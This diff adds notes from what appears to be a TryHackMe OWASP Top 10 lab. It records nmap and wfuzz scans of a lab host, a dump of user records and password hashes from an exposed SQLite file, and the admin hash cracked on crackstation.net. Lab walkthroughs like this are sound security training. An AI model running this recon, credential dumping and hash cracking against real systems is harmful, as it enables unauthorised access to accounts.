@@ -1,0 +1,62 @@
+Nmap scan: nmap -Pn -n --open -vv <ip>
+
+Reason: 954 conn-refused and 45 no-responses
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack
+
+______________________________________________________________________________
+
+$ wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404,4000,403 http://10.10.128.178/FUZZ
+ 
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.128.178/FUZZ
+Total requests: 4614
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                            
+=====================================================================
+
+000000001:   200        25 L     221 W      1777 Ch     "http://10.10.128.178/"                                                                            
+000000428:   301        9 L      28 W       312 Ch      "api"                                                                                              
+000000499:   301        9 L      28 W       315 Ch      "assets"                                                                                           
+000001007:   301        9 L      28 W       316 Ch      "console"                                                                                          
+000001575:   200        136 L    2261 W     138122 Ch   "favicon.ico"                                                                                      
+000002021:   200        25 L     221 W      1777 Ch     "index.php"                                                                                        
+000002347:   301        9 L      28 W       314 Ch      "login"                                                                                            
+______________________________________________________________________________                           
+
+Here the route "assets" had the db was in "flat-file", meaning that there was no database, 
+the sensitive content was stored in a file xD
+                                                                                                                                         
+┌──(kali㉿kali)-[~/Fer/tryhackme/owaspTOP10]
+└─$ mv ~/Downloads/webapp.db .
+                                                                                                                                                                    
+┌──(kali㉿kali)-[~/Fer/tryhackme/owaspTOP10]
+└─$ ls
+nmapCommandInjection.txt  nmapSDEScan.txt  webapp.db
+
+______________________________________________________________________________                                                                                                                                                                    
+┌──(kali㉿kali)-[~/Fer/tryhackme/owaspTOP10]
+└─$ sqlite3 webapp.db                                        
+
+SQLite version 3.34.1 2021-01-20 14:10:07
+Enter ".help" for usage hite> .tables
+sessions  users   
+sqlite> SELECT * FROM users
+   ...> ;
+4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
+23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
+4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
+
+_____________________________________________________________________________
+
+ -> crackstation.net to crack the admin password -> qwertyuiop
+
+ -> log in with the credentials
+
+
+
